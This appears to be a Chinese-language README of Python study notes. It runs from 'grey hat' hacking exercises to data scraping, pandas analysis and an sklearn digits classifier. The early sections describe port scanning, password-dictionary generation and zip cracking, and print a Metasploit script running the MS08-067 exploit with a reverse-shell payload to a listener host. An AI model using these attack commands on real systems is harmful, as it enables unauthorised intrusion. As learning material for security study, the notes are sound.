# learn-python
###20160510 python 灰帽编程 3   
  ip、port扫描器；生成ip段。
###20160510 python 灰帽编程 4   
  解析域名，生成用户名-口令 字典，包括根据域名生成的用户名口令。
###20160705 python绝技 
####retBanner.py
  socket扫描ip，port，通过返回的banner查询vulnerable.txt
####zippass.py
  zFile = zipfile.ZipFile('evil.zip', 'r')
  zFile.extractall(pwd='password')
  使用多线程：
  t = Thread(target = functionname, args = (args))
  t.start
####4scanner.py
  argparse解析命令行参数
  # 参数用-h会与默认的帮助的-h冲突
    # 命令行下运行时需要使用python name.py
    # --portlist --后的是变量名
    # nargs = '*' 可是多个变量（端口）

```python
  def findTgts(subNet):
    nmScan = nmap.PortScanner()
    nmScan.scan(subNet, '445')
    tgtHosts = []
    for host in nmScan.all_hosts():
        if nmScan[host].has_tcp(445):
            state = nmScan[host]['tcp'][445]['state']
            if state == 'open':
                print '[+] Found Target Host: ' + host
                tgtHosts.append(host)
    return tgtHosts
```
####2-5-conficker.py
  使用python nmap发现主机（扫描）
```python
  def findTgts(subNet):
    nmScan = nmap.PortScanner()
    nmScan.scan(subNet, '445')
    tgtHosts = []
    for host in nmScan.all_hosts():
        if nmScan[host].has_tcp(445):
            state = nmScan[host]['tcp'][445]['state']
            if state == 'open':
                print '[+] Found Target Host: ' + host
                tgtHosts.append(host)
    return tgtHosts
```
  使用python为metasploit配置.rc文件，操作metasploit：
```python
configFile.write('use exploit/windows/smb/psexec\n')
  ...
  configFile = open('meta.rc', 'w')
```
####2-6-freeFloat.py
  写PoC
```shell
  use exploit/windows/smb/ms08_067_netapi
  set RHOST 192.168.1.37
  set PAYLOAD windows/meterpreter/reverse_tcp
  set LHOST 192.168.77.77
  set LPORT 7777
  exploit –j –z
```
  为了利用Metasploit的攻击，我们选择我们的Exploit(exploit/windows/smb/ms08_067_netapi)，然后设置目标为192.168.1.37。接下来我们指定攻击荷载为windows/meterpreter/reverse_tcp选择反向连接到我们的192.168.77.77的7777端口上，最后我们告诉Metasploit开始攻击系统。保存配置文件为conficker.rc，我们可以通过命令
  msfconsole -r conficker.rc
  来启动我们的攻击。这个命令会告诉Metasploit根据conficker.rc来启动攻击。如果成功，我们的攻击会返回一个命令行Shell来控制对方电脑。 

####32recycle.py 
  用Python 将用户的SID 关联起来:通过检查 Windows 注册表键值HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\<SID>\ProfileImagePath，我们可以看到它返回 一个是%SystemDrive%\Documents and Settings\<USERID>。在下图中，我 们看到这允许我们将SID 为S-1-5-21-1275210071-1715567821-725345543- 1005 转化为用户名“alex”。
  ```python
  key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\\" + sid)
              (value, type) = _winreg.QueryValueEx(key, "ProfileImagePath")
              user = value.split('\\')[-1]
  ```

###20161204 使用python抓取并分析数据—链家网(requests+BeautifulSoup)
	http://bluewhale.cc/2016-12-04/use-python-crawl-and-analysis-data-lianjia-requests-and-beautifulsoup.html
	scipy的安装问题【scipy-0.15.1-win32-superpack-python2.7.exe安装包】
	pandas入门 http://pda.readthedocs.io/en/latest/chp5.html
	sklearn 是一个 Python 的 科学计算库，提供了数种聚类算法可供选择；numpy、scipy 是 Python 的科学运算库，matplotlib 是图形库，用于绘图。http://www.jianshu.com/p/93c03a09d689
###20161220 renrendai爬虫与贷款数据分析
  画图，pandas中数据的分类统计；
  ```python
  #按贷款目的汇总贷款笔数
  title_count=rrd.groupby('title')['amount'].agg('count')
  ```
###20161227 python机器学习sklearn
  官方例子：\learn-python\sklearn\plot_digits_classification.py
  from sklearn import datasets 自带数据集
  digits = datasets.load_digits() 手写数字数据
  SVM分类，前一半训练，后一半预测（分类）
  ```python
  # Create a classifier: a support vector classifier
  classifier = svm.SVC(gamma=0.001)
  # We learn the digits on the first half of the digits
  classifier.fit(data[:n_samples / 2], digits.target[:n_samples / 2])
  # Now predict the value of the digit on the second half:
  expected = digits.target[n_samples / 2:]
  predicted = classifier.predict(data[n_samples / 2:])
  ```
  画图
  ```python
  #使用方法：subplot（m,n,p）subplot是将多个图画到一个平面上的工具。
  # 其中，m表示是图排成m行，n表示图排成n列，也就是整个figure中有n个图是排成一行的，
  # 一共m行，如果m=2就是表示2行图。p表示图所在的位置，p=1表示从左到右从上到下的第一个位置。
  plt.subplot(4, 7, index + 15)
  ```
###20170221 NYC_Taxi 使用Python分析纽约出租车搭乘数据
  Read more: http://bluewhale.cc/#ixzz4ZIpKZQqW
  pd操作

